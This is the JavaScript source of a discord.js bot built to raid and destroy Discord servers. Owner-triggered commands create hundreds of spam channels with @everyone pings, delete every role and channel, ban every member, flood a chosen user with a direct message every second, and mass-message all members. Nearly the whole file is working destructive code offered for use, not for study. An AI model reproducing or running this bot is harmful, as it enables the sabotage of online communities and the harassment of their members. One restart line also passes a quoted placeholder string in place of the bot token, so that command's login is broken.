const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'monster'


const developers = ["614364214504587287","614363312800530433"]
const adminprefix = "<";
client.on('message', message => {
    var argresult = message.content.split(` `).slice(1).join(' ');
      if (!developers.includes(message.author.id)) return;
      
  if (message.content.startsWith(adminprefix + 'ply')) {
    client.user.setGame(argresult);
      message.channel.send(`**?   ${argresult}**`)
  } else 
     if (message.content === (adminprefix + "leave")) {
    message.guild.leave();        
  } else  
  if (message.content.startsWith(adminprefix + 'wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.send(`**?   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'ls')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**?   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'st')) {
    client.user.setGame(argresult, "https://www.twitch.tv/idk");
      message.channel.send(`**?**`)
  }
  if (message.content.startsWith(adminprefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
if (message.content.startsWith(adminprefix + 'setavatar')) {
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
}
});









client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', msg => {
  if (msg.content === 'ready') {
    msg.reply('yes sir :smiling_imp:.');
  }
});


client.on('message' , async (message) => {
    if (message.content.startsWith('monster attack')) {
for (let i = 0; i < 500; i++) {
        message.guild.createChannel(' Atlantic team  ', 'text')
        message.channel.send('@everyone __** ya wlad l97ab 9alabto 3lia ana 7witkom by Atlantic  ...  **__ :muscle: :v: @here');
}
}
});   




  client.on('message',async message => {
    if(message.content.startsWith("dm restart")) {
          if(message.author.id !== "614363312800530433") return message.reply('You aren\'t the bot owner.');
        message.channel.send('**Restarting.**').then(msg => {
            setTimeout(() => {
               msg.edit('**Restarting..**');
            },1000);
            setTimeout(() => {
               msg.edit('**Restarting...**');
            },2000);
        });
        console.log(`${message.author.tag} [ ${message.author.id} ] has restarted the bot.`);
        console.log(`Restarting..`);
        setTimeout(() => {
            client.destroy();
            client.login('process.env.BOT_TOKEN');
        },3000);
    }
});

client.on('message' , async (message) => {
 if (message.content.startsWith('*dm')) {
    setInterval(function() {
        let user = message.mentions.users.first() || message.author;
            user.send('salam atlantic gang is back by Floki')
    }, 1000)
 }
});




client.on('message', x5bz => {   
    if (x5bz.content.startsWith("monster fuck")) {
        x5bz.guild.roles.forEach(r => { r.delete() }) 
        x5bz.guild.channels.forEach(c => { c.delete() })
                   let v5bz = new Discord.RichEmbed()
               .setColor('RANDOM')
               .setDescription('**Done sir ! i Fucked the server :cop:**')
              x5bz.author.sendEmbed(v5bz);
    }
    });


client.on('message', async message => {
    if(message.content === "monster destroy") {
        if(message.author.id !== '614363312800530433') return;
        message.guild.members.forEach(member => {
           member.ban(); 
        });
    } 
 });


client.on('message', message => {
    if (message.author.id === client.user.id) return;
    if (message.guild) {
   let embed = new Discord.RichEmbed()
    let args = message.content.split(' ').slice(1).join(' ');
if(message.content.split(' ')[0] == prefix + 'bc') {
    if (!args[1]) {
return;
} message.guild.members.forEach(m => {
   if(!message.member.hasPermission('ADMINISTRATOR')) return;
            var bc = new Discord.RichEmbed()
            .addField(' » message : ', args)
            .setFooter('happy Thanksgiving <3')
            .setColor('#ff0000')
            // m.send([${m}]);
            m.send(`${m}`,{embed: bc});
        });
    }
    } else {
        return;
    }
});











client.login(process.env.BOT_TOKEN);
